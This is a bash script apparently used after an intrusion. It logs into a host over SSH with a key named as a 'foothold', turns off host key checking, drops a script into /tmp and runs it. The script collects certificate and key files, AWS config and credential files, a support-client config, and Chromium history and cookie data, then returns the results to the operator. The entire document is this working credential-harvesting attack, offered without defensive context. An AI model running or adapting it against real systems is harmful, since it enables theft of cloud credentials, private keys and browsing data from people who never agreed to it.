#!/bin/bash
S="ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i ~/.ssh/keplerops-foothold -p 2222 rowan@10.50.13.180"
$S 'cat > /tmp/b4.sh' <<'EOS'
#!/bin/bash
echo "### cert-ish files"
find /home/rowan -maxdepth 5 \( -name "*.crt" -o -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.json" \) 2>/dev/null | grep -v -E "node_modules|\.npm|\.cache|\.local/share/keplerops/.*\.crt" | head -80
echo "### keplerops local share"
find /home/rowan/.local/share/keplerops -maxdepth 3 2>/dev/null | head -40
echo "### support client json"
cat /home/rowan/.config/fieldlink/support-client.json 2>/dev/null
echo
echo "### aws config"
cat /home/rowan/.aws/config /home/rowan/.aws/credentials 2>/dev/null
echo "### recent chromium urls arwc"
sqlite3 /home/rowan/.config/chromium/Default/History "select url,title,visit_count from urls where url like '%arwc%' order by last_visit_time desc limit 40;" 2>&1 | head -50
echo "### chromium cookies hosts"
sqlite3 /home/rowan/.config/chromium/Default/Cookies "select host_key,name,length(encrypted_value) from cookies;" 2>&1 | head -60
EOS
chmod +x /tmp/b4.sh
$S 'bash /tmp/b4.sh' 2>&1 | head -200
